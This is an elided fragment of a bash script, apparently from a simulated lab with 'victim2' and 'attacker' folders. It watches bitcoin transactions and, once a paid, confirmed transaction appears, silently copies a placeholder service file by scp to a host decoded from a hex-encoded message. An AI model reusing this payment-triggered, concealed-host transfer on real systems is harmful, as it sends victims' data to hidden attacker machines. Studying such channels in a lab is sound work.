...
echo "Service from victim2!" > ~/victim2/serviceVictim2.txt 
echo "Timestamp: [$(date +%s)]" >> ~/victim2/serviceVictim2.txt
...
for JSON in $(echo "$(bitcoin-cli listtransactions '*' 200)" | jq -c '.[]'); do
	...
	done < ~/victim2/finishedTransactions.txt
	...
	if [[ $(echo "$RAW_TX_JSON" | jq -e '.vin[0] | has("coinbase")') == "false" ]] && [[ $(echo "$AMMOUNT_PAID>=$PRICE" | bc) == "1" ]] && [[ $TRANSACTION_FINISHED == "false" ]] && [[ $(echo "$EXISTING_CONFIRMATIONS>=$REQUIRED_CONFIRMATIONS" | bc) == "1" ]]; then
		...
		scp ~/victim2/serviceVictim2.txt $(echo $ENCODED_MESSAGE | xxd -r -p):~/attacker/victim2/serviceVictim2.txt &> /dev/null

		#Add the transaction id into the finishedTrasactions.txt file.
		echo $(echo $JSON | jq -r '.txid') >> ~/victim2/finishedTransactions.txt
